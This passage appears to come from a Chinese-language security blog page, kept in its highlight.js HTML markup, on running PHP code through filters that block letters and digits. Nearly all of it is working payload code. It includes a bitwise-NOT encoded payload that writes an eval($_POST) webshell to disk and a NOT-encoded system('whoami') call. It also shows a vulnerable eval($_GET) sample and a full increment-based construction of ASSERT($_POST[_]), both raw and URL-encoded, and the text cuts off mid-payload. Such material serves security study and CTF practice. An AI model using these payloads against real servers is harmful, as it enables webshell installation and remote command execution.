class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs llvm">//写马<br>//file_put_contents(&#x27;<span class="hljs-number">4</span>.php&#x27;<span class="hljs-punctuation">,</span>&#x27;&lt;?php eval(\$_POST[<span class="hljs-number">1</span>])<span class="hljs-comment">;&#x27;);</span><br>(~(<span class="hljs-variable">%99</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%A0</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%8</span>A<span class="hljs-variable">%8</span>B<span class="hljs-variable">%A0</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%90</span><span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%9</span>A<span class="hljs-variable">%91</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%8</span>C))(~(<span class="hljs-variable">%CB</span><span class="hljs-variable">%D1</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F)<span class="hljs-punctuation">,</span>~(<span class="hljs-variable">%C3</span><span class="hljs-variable">%C0</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%97</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%DF</span><span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span><span class="hljs-variable">%C4</span>))<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>//命令执行<br>//(call_user_func)(system<span class="hljs-punctuation">,</span>whoami<span class="hljs-punctuation">,</span>&#x27;&#x27;)<br>(~<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%93</span><span class="hljs-variable">%93</span><span class="hljs-variable">%a0</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%8</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%99</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%91</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span>)(~<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%86</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%8</span>b<span class="hljs-variable">%9</span>a<span class="hljs-variable">%92</span><span class="hljs-punctuation">,</span>~<span class="hljs-variable">%88</span><span class="hljs-variable">%97</span><span class="hljs-variable">%90</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%92</span><span class="hljs-variable">%96</span><span class="hljs-punctuation">,</span>&#x27;&#x27;)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h4 id="自增-有限制"><a href="#自增-有限制" class="headerlink" title="自增(有限制)"></a>自增(有限制)</h4><p>注意是php5环境。</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>来自p牛的经典bypas，使用[]数组获取array中的第一个字符 ‘a’ ，然后通过自增去获取其它字符最终构造出webshell：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>; <span class="hljs-comment">// $_=&#x27;Array&#x27;;</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-comment">// $_=$_[0];</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-comment">// A</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// E </span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// R</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// P</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// O</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// S</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-comment">// T</span><br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-comment">// ASSERT($_POST[_]);</span><br></code></pre></td></tr></table></figure><p>连接起来就是</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">shell=<span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;$_&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[<span class="hljs-number">_</span>]);<br><br>//urlencode<br>shell=<span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%5B</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%40</span><span class="hljs-meta">%22</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%22</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%5B</span><span class="hljs-string">&#x27;!&#x27;</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%3D</span><span class="hljs-string">&#x27;%40&#x27;</span><span class="hljs-meta">%5D</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span><span class="hljs-meta">%3D</span><span class="hljs-string">&#x27;_&#x27;</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span 